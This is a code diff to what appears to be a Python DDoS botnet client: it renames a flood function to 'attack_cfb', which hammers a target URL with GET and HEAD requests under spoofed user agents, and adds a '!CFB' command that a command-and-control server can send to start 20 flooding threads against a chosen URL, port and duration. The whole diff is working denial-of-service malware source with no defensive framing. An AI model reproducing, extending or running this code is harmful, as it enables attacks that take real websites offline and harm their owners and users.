@@ -1069,7 +1069,7 @@ def attack_udp_gbps(ip, port, end_time, size):
 def rand_ua():
     return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())
 
-def attack_tls(url, port, end_time, size):
+def attack_cfb(url, port, end_time, size):
     url = url + ":" + port
     while time.time() < end_time:
         try:
@@ -1084,7 +1084,6 @@ def attack_tls(url, port, end_time, size):
             while time.time() < end_time:
                 scraper.get(url, headers=headers, timeout=15)
                 scraper.head(url, headers=headers, timeout=15)
-                
         except Exception as e:
             print("Error:", e)
             continue
@@ -1229,6 +1228,15 @@ def main():
                     threads = 20
                     for _ in range(threads):
                         threading.Thread(target=attack_udp_gbps, args=(ip, port, end_time, size), daemon=True).start()
+                if command == '!CFB':
+                    url = args[1]
+                    port = int(args[2])
+                    duration = int(args[3])
+                    end_time = time.time() + duration
+                    size = 65500
+                    threads = 20
+                    for _ in range(threads):
+                        threading.Thread(target=attack_cfb, args=(url, port, end_time, size), daemon=True).start()
                 elif command == 'PING':
                     c2.send('PONG'.encode())
             except:
